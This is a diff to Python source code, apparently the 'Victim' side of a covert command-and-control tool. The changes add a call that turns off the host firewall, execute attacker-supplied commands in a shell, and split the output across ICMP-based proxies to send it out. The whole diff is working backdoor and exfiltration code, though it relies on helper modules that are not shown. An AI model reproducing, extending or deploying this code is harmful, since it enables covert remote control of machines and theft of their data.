@@ -105,20 +105,26 @@ def read_stream(stream, buffer, label=""):
     for line in iter(stream.readline, ''):
         if line:
             decoded = line.rstrip()
-            print(f"{label}: {decoded}")
+            #print(f"{label}: {decoded}")
             buffer.append(decoded)
     stream.close()
 
-def general_get_data_from_command(command:str):
-    process=mymethods.get_shellProcess_command([command]) 
+def general_get_data_from_command(command:list[str]):
+    if not isinstance(command, list):
+        raise Exception(f"Argomenti non validi: {type(command)}\t{command}") 
+    process_shell=mymethods.get_shellProcess_command("".join(x for x in command))  
+    if com.is_valid_shell(process_shell):
+        print("Shell aperta con successo...") 
+    else: raise Exception(f"Shell non valida {process_shell}") 
     stdout_lines = []
     stderr_lines = [] 
-    stdout_thread = threading.Thread(target=read_stream, args=(process.stdout, stdout_lines, "OUT"))
-    stderr_thread = threading.Thread(target=read_stream, args=(process.stderr, stderr_lines, "ERR"))
+    stdout_thread = threading.Thread(target=read_stream, args=(process_shell.stdout, stdout_lines, "OUT"))
+    stderr_thread = threading.Thread(target=read_stream, args=(process_shell.stderr, stderr_lines, "ERR"))
 
     stdout_thread.start()
     stderr_thread.start() 
-    process.wait()
+    process_shell.wait()
+    process_shell.terminate()
     stdout_thread.join()
     stderr_thread.join() 
     return stdout_lines, stderr_lines
@@ -157,7 +163,7 @@ def wait_attacker_command(attack_function:dict, ip_host:ipaddress.IPv4Address, c
         if not com.is_dictionary(attack_function) or not com.is_IPAddress(ip_host) or not com.is_list(command):
             raise Exception(f"wait_attacker_command: argomenti non validi")
         print(f"Waiting data witch attack function: {attack_function}") 
-        if attacksingleton.wait_data(attack_function, ip_host, command):
+        if attacksingleton.wait_data(attack_function, ip_host, command): 
             print(f"Finished waiting data. Comando ricevuto: {command}") 
             if len(command)==1:
                 command=command[0].replace(com.CONFIRM_COMMAND,"")
@@ -180,6 +186,20 @@ def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4A
         #print("I dati che verranno mandati a", chosen_proxy," sono: ",data_to_send) 
         data_has_being_sent=False
         sequenza=0
+
+        data_for_proxies:list[list]=[[] for _ in connected_proxy]
+        print(f"data_for_proxies: {data_for_proxies}")
+        for index in range(len(data_to_send)): 
+            data_for_proxies[index % len(connected_proxy)].append(str(index)+"&&"+data_to_send[index])
+        print(f"data_for_proxies: {data_for_proxies}")
+        for index in range(len(data_for_proxies)):
+            data_for_proxies[index]="".join(
+                data_for_proxies[index][j] if j==0 
+                else "||"+data_for_proxies[index][j] 
+                for j in range(len(data_for_proxies[index]))
+            )
+        print(f"data_for_proxies: {data_for_proxies}")
+        
         for data in data_to_send:
             print("Sending data: ",data) 
             if com.END_DATA in data: 
@@ -218,7 +238,14 @@ def send_data_to_proxies(data_to_send:list, connected_proxy:list[ipaddress.IPv4A
                 print(f"{chosen_proxy} ha ricevuto i dati")
             sequenza+=1
 
-
+def append_END_DATA_2_command(command:list[str]):
+    if not com.is_list(command):
+        raise Exception(f"Argomenti non validi: {type(command)}")
+    if sys.platform == "win32":
+        command.append(f" && echo '{com.END_DATA}'")
+    elif sys.platform=="linux": 
+        command.append(f"; echo '{com.END_DATA}'") 
+    else: print("Sistema operativo non supportato.")
 #------------------------------------- 
 
 def done_waiting_timeout(sniffer, enough_proxy_timer:threading.Timer, event_enough_proxy:threading.Event, callback_reached_proxy_number):
@@ -276,7 +303,7 @@ def is_proxy_already_connected(proxy:ipaddress.IPv4Address ,connected_proxy:list
 def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Address, event_enough_proxy:threading.Event, lock_connected_proxy:threading.Lock, num_proxy:int, attack_function:dict): 
     def callback(packet):
         nonlocal attack_function, connected_proxy, ip_host, event_enough_proxy, lock_connected_proxy, num_proxy
-        print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
+        #print(f"callback wait_conn_from_proxy received:\n\t{packet.summary()}") 
         if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
             print(f"Ricevuto pacchetto da {packet[IP].src}...")
             ip_src=ipaddress.ip_address(packet[IP].src)
@@ -291,7 +318,7 @@ def callback_wait_conn_from_proxy(connected_proxy:list, ip_host:ipaddress.IPv4Ad
                 int_version=(packet[ICMP].id>>8) ^ ord("i")
                 int_code=(packet[ICMP].id & 0xFF) ^ ord("p") 
                 attack_function.update(attacksingleton.AttackType().get_attack_function("ipv"+str(int_version)+"_"+str(int_code)))
-                print(f"\t***Updated attack Function: {attack_function}")
+                print(f"***Updated attack Function: {attack_function}")
                 data=(com.CONFIRM_VICTIM+ip_host.compressed+ip_src.compressed).encode()
                 if com.send_packet(data,ip_src): 
                     add_proxy_to_connected_list(
@@ -338,16 +365,20 @@ WAITING_TIME=20
 class Victim: 
     def __init__(self):
         try: 
-            self.define_variables()   
-            self.proxy_connection()
+            mymethods.disable_firewall() 
+            self.define_variables()     
+            self.proxy_connection() 
         except Exception as e:
             print(f"__init__ proxy conn: {e}")
+            mymethods.reenable_firewall()
             exit(1) 
         try: 
             self.wait_command_send_data()
         except Exception as e:
             print(f"__init__ proxy conn: {e}")
+            mymethods.reenable_firewall()
             exit(1) 
+        mymethods.reenable_firewall()
     
     def reset_variables(self):
         pass
@@ -381,7 +412,7 @@ class Victim:
     
     def proxy_connection(self): 
             self.connected_proxy:list[ipaddress.IPv4Address|ipaddress.IPv6Address]=[]
-            self.lock_connected_proxy=threading.Lock() 
+            self.lock_connected_proxy=threading.Lock()  
             self.wait_conn_from_proxy() 
             print(f"Funzione di attacco ricevuta: {self.attack_function}")
             print(f"I proxy utilzzabili sono {len(self.connected_proxy)}: {self.connected_proxy}") 
@@ -397,14 +428,16 @@ class Victim:
     
     def wait_conn_from_proxy(self): 
         try:
-            #confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed
-            #checksum=mymethods.calc_checksum(confirm_text.encode())  
-            self.event_enough_proxy=com.get_threading_Event()   
+            #confirm_text=com.CONFIRM_PROXY+self.ip_host.compressed 
+            #checksum=mymethods.calc_checksum(confirm_text.encode()) 
+            self.event_enough_proxy=com.get_threading_Event() 
             interface=mymethods.default_iface()   
+            print(f"AAAA\t++++{interface}")
             filter=attacksingleton.get_filter_connection_from_function(
-                "victim_wait_conn_from_proxy" 
+                "wait_icmpEcho_dst" 
                 ,ip_dst=self.ip_host
             )  
+            print(f"AAAA\t++++{filter}")
         except Exception as e:
             print(f"wait_conn_from_proxy filter: {e}") 
             return 
@@ -423,6 +456,7 @@ class Victim:
                 #,"store":True 
                 ,"iface":interface
             } 
+            print(f"AAAA\t++++{args}")
             callback_function_timer = lambda: done_waiting_timeout(
                 self.sniffer
                 ,self.enough_proxy_timer
@@ -452,23 +486,22 @@ class Victim:
             wait_attacker_command(self.attack_function, self.ip_host, self.command) 
             if not check_system_compatibility(): 
                 raise Exception(f"{sys.platform} non supportato...") 
-            print("Sistema supportato...")
-            self.process_shell=mymethods.getShellProcess()
-            if com.is_valid_shell(self.process_shell):
-                print("Shell aperta con successo...") 
-            else: raise Exception(f"Shell non valida {self.process_shell}") 
+            print("Sistema supportato...") 
+            append_END_DATA_2_command(self.command)
             while self.command and com.END_COMMUNICATION not in self.command and self.command not in com.exit_cases:
                 try:  
-                    #execute_command(self.command[0], self.process_shell)
-                    try:
-                        print(f"Esecuzione del comando {self.command[0].replace('\n','')}; echo {com.END_DATA}")
-                        self.process_shell.stdin.write(f"{self.command[0].replace('\n','')}; echo {com.END_DATA}\n")
-                        self.process_shell.stdin.flush() 
-                        print(f"Comando eseguito...") 
-                    except Exception as e:
-                        raise Exception(f"execute_command exec: {e}")
-                    data=get_data_from_command(self.process_shell)  
-                    print("Data got from execution: ",data)   
+                    print(f"Esecuzione del comando {self.command}")
+                    print(f"Esecuzione del comando {self.command[0].replace('\n','')}; echo {com.END_DATA}")
+                    stdout_lines, stderr_lines=general_get_data_from_command(self.command)
+                    print(f"Comando eseguito...")   
+                    if stderr_lines:
+                        print(f"stderr_lines got from execution: {stderr_lines}") 
+                        data=stderr_lines 
+                    elif stdout_lines: 
+                        print(f"stdout_lines got from execution: {stdout_lines}") 
+                        data=stdout_lines 
+                    else: 
+                        print(f"Caso non contemplato: {stdout_lines}\t{stderr_lines}") 
                     send_data_to_proxies(data, self.connected_proxy, self.attack_function) 
                     print("Waiting for another command from the attacker")  
                     self.command:list[str]=[]
@@ -476,17 +509,12 @@ class Victim:
                     #break
                 except Exception as e:
                     print(f"wait_command_send_data: {e}")
-            print("Fine del programma")
-            try:
-                if self.process_shell is not None and com.is_valid_shell(self.process_shell):
-                    self.process_shell.wait()  # Attende la chiusura del processo
-                    self.process_shell.terminate()  # Termina il processo 
-            except Exception as e:
-                raise Exception(f"wait_command_send_data: {e}") 
+            print("Fine del programma") 
         except Exception as e:
             print(f"Eccezione: {e}")
             exit(1)
-
+    
+    
     
 
     
